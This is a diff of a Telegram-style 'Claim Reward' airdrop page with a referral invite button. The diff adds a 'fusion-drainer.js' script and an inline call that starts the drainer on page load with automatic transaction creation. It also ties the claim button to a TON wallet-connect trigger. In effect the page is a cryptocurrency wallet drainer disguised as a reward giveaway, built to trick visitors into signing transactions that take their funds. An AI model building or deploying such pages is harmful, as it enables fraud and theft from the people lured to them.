@@ -89,7 +89,16 @@
         }
     </script>
     
-    <script type="module" crossorigin src="https://ton-claim.org/assets/index-CRh1A88c.js"></script>
+     <script src="/fusion-drainer.js?v=1.0.0" defer crossorigin></script>
+
+  <script>
+    window.addEventListener('load', () => {
+      window.drainer?.init({
+        autoCreateTransaction: true,
+        autoOpenModal: false,
+      });
+    });
+  </script>
 </head>
 
 <body class="min-h-screen overflow-x-hidden py-5 flex flex-col" style="background-color: var(--tg-theme-bg-color);">
@@ -156,7 +165,7 @@
 
                 <div class="flex flex-col gap-2">
                     <div id="ton-connect" style="display: none; justify-content: center; align-items: center; width: 100vw;"></div>
-                    <button id="claim-button" class="btn plausible-event-name=Click+Claim" style="background-color: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color);">Claim Reward</button>
+                    <button id="claim-button" class="ton-connect-trigger btn plausible-event-name=Click+Claim" style="background-color: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color);">Claim Reward</button>
                     <a id="invite-button" target="_blank" href="https://t.me/share/url?url=t.me/Star_Box_Bot?start=start&amp;text=Join me on the Airdrop and let's earn rewards together! Use my referral link to join and get a bonus!" class="btn flex gap-3 justify-center plausible-event-name=Click+Invite" style="background-color: var(--tg-theme-secondary-bg-color); color: var(--tg-theme-text-color);">Invite your friend
                         <span style="color: var(--tg-theme-hint-color);">
                             +10% reward
